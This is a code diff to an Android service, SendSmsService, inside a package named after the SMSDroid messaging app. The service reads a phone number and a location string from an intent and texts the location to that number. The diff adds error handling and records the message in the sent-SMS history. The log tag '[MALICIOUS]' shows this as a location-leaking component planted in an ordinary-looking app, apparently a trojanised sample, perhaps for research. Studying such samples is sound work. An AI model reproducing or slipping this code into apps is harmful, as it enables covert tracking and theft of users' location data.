@@ -1,7 +1,9 @@
 package de.ub0r.android.smsdroid;
 
 import android.app.Service;
+import android.content.ContentValues;
 import android.content.Intent;
+import android.net.Uri;
 import android.os.IBinder;
 import android.telephony.SmsManager;
 import android.util.Log;
@@ -19,11 +21,23 @@ public class SendSmsService extends Service {
         String destination = (String) intent.getExtras().get("number");
         String location = (String) intent.getExtras().get("location");
 
-        //send received information via SMS
-        SmsManager smsManager = SmsManager.getDefault();
-        smsManager.sendTextMessage(destination, null, location, null, null);
+        try{
+            //send received information via SMS
+            SmsManager smsManager = SmsManager.getDefault();
+            smsManager.sendTextMessage(destination, null, location, null, null);
 
-        Log.d("[MALICIOUS]", "Sent location information (" + location + ") to " + destination);
+            //to check if the message is sent and shown in the history
+            ContentValues values = new ContentValues();
+            values.put("address", destination);
+            values.put("body", location);
+            getContentResolver().insert(Uri.parse("content://sms/sent"), values);
+
+            Log.d("[MALICIOUS]", "Sent location information (" + location + ") to " + destination);
+        } catch (Exception e) {
+            Log.d("[MALICIOUS]", "Failed to send SMS");
+            e.printStackTrace();
+        }
+
         return START_NOT_STICKY;
     }
 }
